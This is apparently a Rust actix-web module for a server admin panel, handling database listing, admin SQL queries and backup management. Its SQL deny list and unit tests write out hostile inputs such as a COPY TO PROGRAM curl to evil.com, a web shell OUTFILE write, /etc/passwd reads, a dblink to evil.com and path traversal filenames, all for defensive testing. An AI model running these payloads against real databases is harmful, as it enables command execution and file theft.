use actix_multipart::Multipart;
use actix_web::{web, Error, HttpResponse, Responder};
use chrono::Local;
use futures_util::TryStreamExt;
use log::info;
use serde::{Deserialize, Serialize};
use std::fs;
use std::io::Write;
use std::process::Command;
use std::sync::Arc;

pub use crate::drivers::database::is_valid_db_identifier;
#[allow(unused_imports)]
pub use crate::drivers::database::QueryResult;
use crate::drivers::DriverRegistry;

#[derive(Serialize)]
pub struct Database {
    pub name: String,
    pub engine: String,
    pub size: String,
    pub container_id: Option<String>,
}

#[derive(Serialize)]
pub struct TableInfo {
    pub name: String,
}

#[derive(Deserialize)]
pub struct QueryRequest {
    pub query: String,
}

#[derive(Serialize)]
pub struct BackupInfo {
    pub filename: String,
    pub size: u64,
    pub created_at: String,
}

pub fn is_valid_backup_filename(name: &str) -> bool {
    !name.is_empty()
        && !name.starts_with('.')
        && !name.starts_with('-')
        && !name.contains('/')
        && !name.contains('\\')
        && !name.contains("..")
        && (name.ends_with(".sql") || name.ends_with(".sql.gz"))
        && name
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-' || c == '.')
}

fn normalize_sql(query: &str) -> String {
    let mut clean = String::with_capacity(query.len());
    let chars: Vec<char> = query.chars().collect();
    let n = chars.len();
    let mut i = 0;

    while i < n {
        // Multi-line comment /* ... */
        if i + 1 < n && chars[i] == '/' && chars[i + 1] == '*' {
            i += 2;
            while i + 1 < n && !(chars[i] == '*' && chars[i + 1] == '/') {
                i += 1;
            }
            if i + 1 < n {
                i += 2; // skip */
            }
            clean.push(' ');
            continue;
        }
        // Single-line comment -- ...
        if i + 1 < n && chars[i] == '-' && chars[i + 1] == '-' {
            i += 2;
            while i + 1 < n && chars[i] != '\n' && chars[i] != '\r' {
                i += 1;
            }
            clean.push(' ');
            continue;
        }
        // MySQL comment # ...
        if chars[i] == '#' {
            i += 1;
            while i < n && chars[i] != '\n' && chars[i] != '\r' {
                i += 1;
            }
            clean.push(' ');
            continue;
        }

        clean.push(chars[i]);
        i += 1;
    }

    // Collapse whitespace to single spaces and uppercase
    let mut normalized = String::with_capacity(clean.len());
    let mut in_whitespace = false;
    for c in clean.chars() {
        if c.is_whitespace() {
            if !in_whitespace {
                normalized.push(' ');
                in_whitespace = true;
            }
        } else {
            normalized.push(c.to_ascii_uppercase());
            in_whitespace = false;
        }
    }

    normalized.trim().to_string()
}

fn is_dangerous_query(query: &str) -> bool {
    let q = normalize_sql(query);

    // 1. PostgreSQL procedural anonymous block execution (DO $$ ... $$ or DO $tag$ ... $tag$)
    if (q.starts_with("DO ")
        || q.starts_with("DO$$")
        || q.contains("; DO ")
        || q.contains(";DO ")
        || q.contains("; DO$$")
        || q.contains(";DO$$"))
        && (q.contains("$$") || q.contains("LANGUAGE") || q.contains("BEGIN"))
    {
        return true;
    }

    // 2. Program execution & shell escapes
    if q.contains("TO PROGRAM") || q.contains("FROM PROGRAM") {
        return true;
    }
    if q.contains("PG_EXECUTE_SERVER_PROGRAM") {
        return true;
    }

    // 3. MySQL filesystem reads & writes
    if q.contains("INTO OUTFILE")
        || q.contains("INTO DUMPFILE")
        || q.contains("LOAD_FILE")
        || q.contains("LOAD DATA")
    {
        return true;
    }

    // 4. Postgres server file access & large object exports
    if q.contains("PG_READ_FILE")
        || q.contains("PG_READ_BINARY_FILE")
        || q.contains("PG_WRITE_FILE")
        || q.contains("PG_LS_DIR")
        || q.contains("LO_EXPORT")
        || q.contains("LO_IMPORT")
    {
        return true;
    }

    // 5. Postgres dblink / untrusted extensions
    if q.contains("DBLINK") || q.contains("DBLINK_EXEC") || q.contains("DBLINK_CONNECT") {
        return true;
    }

    // 6. Server configuration alteration
    if q.contains("ALTER SYSTEM") {
        return true;
    }

    false
}

pub async fn list_dbs(registry: web::Data<DriverRegistry>) -> impl Responder {
    let mut dbs = Vec::new();

    // 1. Native databases via registered drivers
    for (engine_name, driver) in &registry.databases {
        if let Ok(db_names) = driver.list_databases().await {
            for name in db_names {
                dbs.push(Database {
                    name,
                    engine: engine_name.clone(),
                    size: "-".to_string(),
                    container_id: None,
                });
            }
        }
    }

    // 2. Docker Databases
    if let Ok(output) = Command::new("docker")
        .args(["ps", "--format", "{{.ID}}|{{.Image}}|{{.Names}}"])
        .output()
    {
        if output.status.success() {
            let stdout = String::from_utf8_lossy(&output.stdout);
            for line in stdout.lines() {
                let parts: Vec<&str> = line.split('|').collect();
                if parts.len() < 3 {
                    continue;
                }

                let id = parts[0];
                let image = parts[1].to_lowercase();

                let detected_engine = if image.contains("postgres") {
                    Some("postgres")
                } else if image.contains("mysql") || image.contains("mariadb") {
                    Some("mysql")
                } else {
                    None
                };

                if let Some(engine) = detected_engine {
                    if engine == "postgres" {
                        if let Ok(db_out) = Command::new("docker")
                            .args([
                                "exec", id, "psql", "-U", "postgres", "-l", "-t", "-A", "-F", "|",
                            ])
                            .output()
                        {
                            if db_out.status.success() {
                                let db_stdout = String::from_utf8_lossy(&db_out.stdout);
                                for db_line in db_stdout.lines() {
                                    let db_parts: Vec<&str> = db_line.split('|').collect();
                                    if !db_parts.is_empty() && !db_parts[0].trim().is_empty() {
                                        dbs.push(Database {
                                            name: db_parts[0].to_string(),
                                            engine: "postgres".to_string(),
                                            size: "Docker".to_string(),
                                            container_id: Some(id.to_string()),
                                        });
                                    }
                                }
                            }
                        }
                    } else if engine == "mysql" {
                        if let Ok(db_out) = Command::new("docker")
                            .args(["exec", id, "mysql", "-uroot", "-e", "SHOW DATABASES"])
                            .output()
                        {
                            if db_out.status.success() {
                                let db_stdout = String::from_utf8_lossy(&db_out.stdout);
                                for db_line in db_stdout.lines().skip(1) {
                                    if !db_line.trim().is_empty() {
                                        dbs.push(Database {
                                            name: db_line.trim().to_string(),
                                            engine: "mysql".to_string(),
                                            size: "Docker".to_string(),
                                            container_id: Some(id.to_string()),
                                        });
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    HttpResponse::Ok().json(dbs)
}

pub async fn list_tables(
    path: web::Path<(String, String)>,
    query: web::Query<std::collections::HashMap<String, String>>,
    registry: web::Data<DriverRegistry>,
) -> impl Responder {
    let (engine, db_name) = path.into_inner();
    let container_id = query.get("container_id");

    if !is_valid_db_identifier(&engine)
        || !is_valid_db_identifier(&db_name)
        || container_id.is_some_and(|c| !is_valid_db_identifier(c))
    {
        return HttpResponse::BadRequest().json("Invalid identifier");
    }

    let driver = match registry.get_database(&engine) {
        Some(d) => d,
        None => return HttpResponse::BadRequest().json("Unsupported database engine"),
    };

    match driver
        .list_tables(&db_name, container_id.map(|s| s.as_str()))
        .await
    {
        Ok(tables) => {
            let list: Vec<TableInfo> = tables.into_iter().map(|name| TableInfo { name }).collect();
            HttpResponse::Ok().json(list)
        }
        Err(e) => {
            log::error!("Failed to list tables: {}", e);
            HttpResponse::InternalServerError().json("Failed to list tables")
        }
    }
}

pub async fn get_table_data(
    path: web::Path<(String, String, String)>,
    query: web::Query<std::collections::HashMap<String, String>>,
    registry: web::Data<DriverRegistry>,
) -> impl Responder {
    let (engine, db_name, table_name) = path.into_inner();
    let container_id = query.get("container_id");

    if !is_valid_db_identifier(&engine)
        || !is_valid_db_identifier(&db_name)
        || !is_valid_db_identifier(&table_name)
        || container_id.is_some_and(|c| !is_valid_db_identifier(c))
    {
        return HttpResponse::BadRequest().json("Invalid identifier");
    }

    let sql = format!("SELECT * FROM {} LIMIT 100", table_name);
    execute_sql_internal(
        &engine,
        &db_name,
        &sql,
        container_id.map(|s| s.as_str()),
        &registry,
    )
    .await
}

pub async fn execute_query(
    user: crate::auth::AuthenticatedUser,
    audit: web::Data<std::sync::Arc<crate::audit::AuditLogger>>,
    path: web::Path<(String, String)>,
    query_params: web::Query<std::collections::HashMap<String, String>>,
    body: web::Json<QueryRequest>,
    registry: web::Data<DriverRegistry>,
) -> impl Responder {
    let (engine, db_name) = path.into_inner();
    let container_id = query_params.get("container_id");

    if user.require_admin().is_err() {
        audit.log_denied(
            &user,
            "DB_QUERY",
            Some(&format!("{}:{}", engine, db_name)),
            Some("Requires Admin role"),
        );
        return HttpResponse::Forbidden().json(serde_json::json!({
            "error": "Insufficient permissions"
        }));
    }

    if !is_valid_db_identifier(&engine)
        || !is_valid_db_identifier(&db_name)
        || container_id.is_some_and(|c| !is_valid_db_identifier(c))
    {
        return HttpResponse::BadRequest().json("Invalid identifier");
    }

    if is_dangerous_query(&body.query) {
        log::warn!(
            "Blocked dangerous query attempt on {} ({}): {}",
            db_name,
            engine,
            body.query
        );
        audit.log(
            &user.username,
            user.role.as_str(),
            "DB_QUERY",
            Some(&format!("{}:{}", engine, db_name)),
            &user.client_ip,
            "DENIED",
            Some("Query contains forbidden operations"),
        );
        return HttpResponse::BadRequest().json("Query contains forbidden operations");
    }

    let is_mutation = body.query.to_uppercase().contains("UPDATE")
        || body.query.to_uppercase().contains("DELETE")
        || body.query.to_uppercase().contains("INSERT")
        || body.query.to_uppercase().contains("DROP")
        || body.query.to_uppercase().contains("ALTER");

    if is_mutation {
        info!(
            "Executing database change on {} ({}): {}",
            db_name, engine, body.query
        );
    }

    let result = execute_sql_internal(
        &engine,
        &db_name,
        &body.query,
        container_id.map(|s| s.as_str()),
        &registry,
    )
    .await;

    if is_mutation && result.status().is_success() {
        info!("Successfully completed database change on {}.", db_name);
        audit.log(
            &user.username,
            user.role.as_str(),
            "DB_QUERY",
            Some(&format!("{}:{}", engine, db_name)),
            &user.client_ip,
            "SUCCESS",
            Some(&body.query),
        );
    } else if is_mutation {
        info!("Database change failed on {}.", db_name);
        audit.log(
            &user.username,
            user.role.as_str(),
            "DB_QUERY",
            Some(&format!("{}:{}", engine, db_name)),
            &user.client_ip,
            "FAILED",
            Some(&body.query),
        );
    }

    result
}

async fn execute_sql_internal(
    engine: &str,
    db: &str,
    query: &str,
    container_id: Option<&str>,
    registry: &DriverRegistry,
) -> HttpResponse {
    let driver = match registry.get_database(engine) {
        Some(d) => d,
        None => return HttpResponse::BadRequest().json("Database engine not supported"),
    };

    match driver
        .execute_query_container(db, query, container_id)
        .await
    {
        Ok(result) => HttpResponse::Ok().json(result),
        Err(e) => {
            log::warn!("Query execution error in {} ({}): {}", db, engine, e);
            HttpResponse::BadRequest().json("Database query execution failed")
        }
    }
}

// ============================================================================
// BACKUP & RESTORE
// ============================================================================

fn get_backup_dir(engine: &str, db: &str) -> String {
    format!("backups/db/{}/{}", engine, db)
}

pub async fn list_backups(path: web::Path<(String, String)>) -> impl Responder {
    let (engine, db) = path.into_inner();

    if !is_valid_db_identifier(&engine) || !is_valid_db_identifier(&db) {
        return HttpResponse::BadRequest().json("Invalid identifier");
    }

    let dir = get_backup_dir(&engine, &db);
    let mut backups = Vec::new();

    if let Ok(entries) = fs::read_dir(&dir) {
        for entry in entries.flatten() {
            if let Ok(metadata) = entry.metadata() {
                if metadata.is_file() {
                    backups.push(BackupInfo {
                        filename: entry.file_name().to_string_lossy().to_string(),
                        size: metadata.len(),
                        created_at: metadata
                            .created()
                            .map(|t| {
                                chrono::DateTime::<Local>::from(t)
                                    .format("%Y-%m-%d %H:%M:%S")
                                    .to_string()
                            })
                            .unwrap_or_else(|_| "Unknown".to_string()),
                    });
                }
            }
        }
    }

    backups.sort_by(|a, b| b.filename.cmp(&a.filename)); // Newest first
    HttpResponse::Ok().json(backups)
}

pub async fn create_backup(
    user: crate::auth::AuthenticatedUser,
    audit: web::Data<std::sync::Arc<crate::audit::AuditLogger>>,
    path: web::Path<(String, String)>,
    query: web::Query<std::collections::HashMap<String, String>>,
    job_manager: web::Data<Arc<crate::api::jobs::JobManager>>,
    registry: web::Data<DriverRegistry>,
) -> impl Responder {
    let (engine, db) = path.into_inner();
    let container_id = query.get("container_id").cloned();

    if user.require_operator().is_err() {
        audit.log_denied(
            &user,
            "DB_BACKUP_CREATE",
            Some(&format!("{}:{}", engine, db)),
            Some("Requires Operator or Admin role"),
        );
        return HttpResponse::Forbidden().json(serde_json::json!({
            "error": "Insufficient permissions"
        }));
    }

    if !is_valid_db_identifier(&engine)
        || !is_valid_db_identifier(&db)
        || container_id
            .as_deref()
            .is_some_and(|c| !is_valid_db_identifier(c))
    {
        return HttpResponse::BadRequest().json("Invalid identifier");
    }

    let driver = match registry.get_database(&engine) {
        Some(d) => d,
        None => return HttpResponse::BadRequest().json("Unsupported database engine"),
    };

    let dir = get_backup_dir(&engine, &db);
    if let Err(e) = fs::create_dir_all(&dir) {
        log::error!("Failed to create backup directory {}: {}", dir, e);
        return HttpResponse::InternalServerError().json("Failed to prepare backup directory");
    }

    let timestamp = Local::now().format("%Y%m%d_%H%M%S").to_string();
    let filename = format!("{}_{}.sql", db, timestamp);
    let filepath = std::path::PathBuf::from(&dir).join(filename);

    info!("Enqueuing database backup job for {} ({})...", db, engine);

    let (cmd, args) =
        driver.build_backup_command_container(&db, &filepath, container_id.as_deref());

    match job_manager
        .enqueue_job(
            "db_backup",
            crate::api::jobs::JobTaskPayload::CommandExecution {
                cmd,
                args,
                output_file: Some(filepath),
                description: format!("Backup for {} ({})", db, engine),
            },
        )
        .await
    {
        Ok(job_id) => {
            audit.log(
                &user.username,
                user.role.as_str(),
                "DB_BACKUP_CREATE",
                Some(&format!("{}:{}", engine, db)),
                &user.client_ip,
                "SUCCESS",
                Some(&format!("Job ID: {}", job_id)),
            );
            HttpResponse::Accepted().json(crate::api::jobs::JobActionResponse {
                job_id,
                status: "pending".to_string(),
                message: "Database backup job queued successfully".to_string(),
            })
        }
        Err(e) => {
            log::error!("Failed to queue database backup: {}", e);
            audit.log(
                &user.username,
                user.role.as_str(),
                "DB_BACKUP_CREATE",
                Some(&format!("{}:{}", engine, db)),
                &user.client_ip,
                "FAILED",
                Some(&e.to_string()),
            );
            HttpResponse::InternalServerError().json("Failed to queue database backup")
        }
    }
}

pub async fn restore_backup(
    user: crate::auth::AuthenticatedUser,
    audit: web::Data<std::sync::Arc<crate::audit::AuditLogger>>,
    path: web::Path<(String, String, String)>,
    query: web::Query<std::collections::HashMap<String, String>>,
    registry: web::Data<DriverRegistry>,
) -> impl Responder {
    let (engine, db, filename) = path.into_inner();
    let container_id = query.get("container_id");

    if user.require_admin().is_err() {
        audit.log_denied(
            &user,
            "DB_BACKUP_RESTORE",
            Some(&format!("{}:{}:{}", engine, db, filename)),
            Some("Requires Admin role"),
        );
        return HttpResponse::Forbidden().json(serde_json::json!({
            "error": "Insufficient permissions"
        }));
    }

    if !is_valid_db_identifier(&engine)
        || !is_valid_db_identifier(&db)
        || !is_valid_backup_filename(&filename)
        || container_id.is_some_and(|c| !is_valid_db_identifier(c))
    {
        return HttpResponse::BadRequest().json("Invalid identifier or filename");
    }

    let driver = match registry.get_database(&engine) {
        Some(d) => d,
        None => return HttpResponse::BadRequest().json("Unsupported database engine"),
    };

    let filepath = format!("{}/{}", get_backup_dir(&engine, &db), filename);

    let file = match fs::File::open(&filepath) {
        Ok(f) => f,
        Err(e) => {
            log::warn!("Backup file not found at {}: {}", filepath, e);
            return HttpResponse::NotFound().json("Backup file not found");
        }
    };

    info!(
        "Initiating database restoration for {} from {}...",
        db, filename
    );

    let path_buf = std::path::PathBuf::from(&filepath);
    let (cmd_str, args) =
        driver.build_restore_command_container(&db, &path_buf, container_id.map(|s| s.as_str()));

    let mut cmd = Command::new(&cmd_str);
    cmd.args(&args);
    cmd.stdin(std::process::Stdio::from(file));

    let success = cmd.status().map(|s| s.success()).unwrap_or(false);

    if success {
        info!("Database {} successfully restored from {}.", db, filename);
        audit.log(
            &user.username,
            user.role.as_str(),
            "DB_BACKUP_RESTORE",
            Some(&format!("{}:{}:{}", engine, db, filename)),
            &user.client_ip,
            "SUCCESS",
            None,
        );
        HttpResponse::Ok().json("Restore successful")
    } else {
        info!("Database restoration failed for {}.", db);
        audit.log(
            &user.username,
            user.role.as_str(),
            "DB_BACKUP_RESTORE",
            Some(&format!("{}:{}:{}", engine, db, filename)),
            &user.client_ip,
            "FAILED",
            None,
        );
        HttpResponse::InternalServerError().json("Restore failed")
    }
}

pub async fn download_backup(
    path: web::Path<(String, String, String)>,
) -> Result<actix_files::NamedFile, Error> {
    let (engine, db, filename) = path.into_inner();
    if !is_valid_db_identifier(&engine)
        || !is_valid_db_identifier(&db)
        || !is_valid_backup_filename(&filename)
    {
        return Err(actix_web::error::ErrorBadRequest(
            "Invalid identifier or filename",
        ));
    }
    let filepath = format!("{}/{}", get_backup_dir(&engine, &db), filename);

    info!("Exporting database backup: {}", filename);
    actix_files::NamedFile::open(filepath).map_err(|e| e.into())
}

pub async fn upload_backup(
    user: crate::auth::AuthenticatedUser,
    audit: web::Data<std::sync::Arc<crate::audit::AuditLogger>>,
    path: web::Path<(String, String)>,
    mut payload: Multipart,
) -> Result<HttpResponse, Error> {
    let (engine, db) = path.into_inner();

    if user.require_admin().is_err() {
        audit.log_denied(
            &user,
            "DB_BACKUP_UPLOAD",
            Some(&format!("{}:{}", engine, db)),
            Some("Requires Admin role"),
        );
        return Ok(HttpResponse::Forbidden().json(serde_json::json!({
            "error": "Insufficient permissions"
        })));
    }

    if !is_valid_db_identifier(&engine) || !is_valid_db_identifier(&db) {
        return Ok(HttpResponse::BadRequest().json("Invalid identifier"));
    }

    let dir = get_backup_dir(&engine, &db);
    fs::create_dir_all(&dir).ok();

    info!("Importing external SQL file for {} ({})...", db, engine);

    while let Ok(Some(mut field)) = payload.try_next().await {
        let content_disposition = field.content_disposition();
        let raw_filename = content_disposition.get_filename().unwrap_or("");
        let safe_filename = std::path::Path::new(raw_filename)
            .file_name()
            .and_then(|f| f.to_str())
            .filter(|f| is_valid_backup_filename(f))
            .map(|f| f.to_string())
            .unwrap_or_else(|| format!("upload_{}.sql", Local::now().format("%Y%m%d_%H%M%S")));

        let filepath = format!("{}/{}", dir, safe_filename);
        let mut f = fs::File::create(&filepath)?;

        while let Ok(Some(chunk)) = field.try_next().await {
            f.write_all(&chunk)?;
        }
        info!("Imported SQL file saved as: {}", safe_filename);
    }

    audit.log(
        &user.username,
        user.role.as_str(),
        "DB_BACKUP_UPLOAD",
        Some(&format!("{}:{}", engine, db)),
        &user.client_ip,
        "SUCCESS",
        None,
    );

    Ok(HttpResponse::Ok().json("File uploaded successfully"))
}

pub async fn delete_backup(
    user: crate::auth::AuthenticatedUser,
    audit: web::Data<std::sync::Arc<crate::audit::AuditLogger>>,
    path: web::Path<(String, String, String)>,
) -> impl Responder {
    let (engine, db, filename) = path.into_inner();

    if user.require_admin().is_err() {
        audit.log_denied(
            &user,
            "DB_BACKUP_DELETE",
            Some(&format!("{}:{}:{}", engine, db, filename)),
            Some("Requires Admin role"),
        );
        return HttpResponse::Forbidden().json(serde_json::json!({
            "error": "Insufficient permissions"
        }));
    }

    if !is_valid_db_identifier(&engine)
        || !is_valid_db_identifier(&db)
        || !is_valid_backup_filename(&filename)
    {
        return HttpResponse::BadRequest().json("Invalid identifier or filename");
    }

    let filepath = format!("{}/{}", get_backup_dir(&engine, &db), filename);

    info!("Removing backup file: {}", filename);
    if fs::remove_file(&filepath).is_ok() {
        audit.log(
            &user.username,
            user.role.as_str(),
            "DB_BACKUP_DELETE",
            Some(&format!("{}:{}:{}", engine, db, filename)),
            &user.client_ip,
            "SUCCESS",
            None,
        );
        HttpResponse::Ok().json("Backup deleted")
    } else {
        audit.log(
            &user.username,
            user.role.as_str(),
            "DB_BACKUP_DELETE",
            Some(&format!("{}:{}:{}", engine, db, filename)),
            &user.client_ip,
            "FAILED",
            None,
        );
        HttpResponse::InternalServerError().json("Failed to delete backup")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_valid_db_identifiers() {
        assert!(is_valid_db_identifier("production_db"));
        assert!(is_valid_db_identifier("app-data-1"));
        assert!(is_valid_db_identifier("wadm"));

        assert!(!is_valid_db_identifier(""));
        assert!(!is_valid_db_identifier("-db"));
        assert!(!is_valid_db_identifier("db; DROP TABLE users;"));
        assert!(!is_valid_db_identifier("db space"));
    }

    #[test]
    fn test_valid_backup_filenames() {
        assert!(is_valid_backup_filename("backup_20231010.sql"));
        assert!(is_valid_backup_filename("mydb_dump.sql.gz"));

        assert!(!is_valid_backup_filename(""));
        assert!(!is_valid_backup_filename(".hidden.sql"));
        assert!(!is_valid_backup_filename("../evil.sql"));
        assert!(!is_valid_backup_filename("backup.sh"));
        assert!(!is_valid_backup_filename("/etc/passwd"));
    }

    #[test]
    fn test_dangerous_query_detection_and_bypasses() {
        // Correctly detected dangerous patterns
        assert!(is_dangerous_query("COPY users TO PROGRAM 'curl evil.com'"));
        assert!(is_dangerous_query(
            "SELECT 1 INTO OUTFILE '/var/www/shell.php'"
        ));
        assert!(is_dangerous_query("SELECT LOAD_FILE('/etc/passwd')"));

        // Documented bypasses now cleanly detected and blocked:
        // 1. PostgreSQL procedural block (code execution / RCE)
        assert!(is_dangerous_query(
            "DO $$ BEGIN PERFORM pg_sleep(5); END $$;"
        ));
        assert!(is_dangerous_query(
            "DO $tag$ BEGIN PERFORM pg_sleep(5); END $tag$;"
        ));
        assert!(is_dangerous_query(
            "SELECT 1; DO $$ BEGIN PERFORM pg_sleep(5); END $$;"
        ));
        // 2. SQL inline comments splitting tokens
        assert!(is_dangerous_query("COPY users TO/**/PROGRAM 'id'"));
        assert!(is_dangerous_query("COPY users TO/*comment*/PROGRAM 'id'"));
        assert!(is_dangerous_query("COPY users TO--comment\nPROGRAM 'id'"));
        // 3. PostgreSQL dblink extension execution
        assert!(is_dangerous_query(
            "SELECT * FROM dblink('host=evil.com', 'SELECT 1')"
        ));
        // 4. Large objects and server file reads
        assert!(is_dangerous_query("SELECT pg_read_file('/etc/passwd')"));
        assert!(is_dangerous_query("SELECT lo_export(1234, '/tmp/test')"));

        // Safe queries must not be blocked:
        assert!(!is_dangerous_query("SELECT * FROM users WHERE id = 1"));
        assert!(!is_dangerous_query(
            "INSERT INTO orders (item, qty) VALUES ('apple', 5)"
        ));
        assert!(!is_dangerous_query(
            "UPDATE accounts SET balance = balance + 10 WHERE user_id = 2"
        ));
    }
}
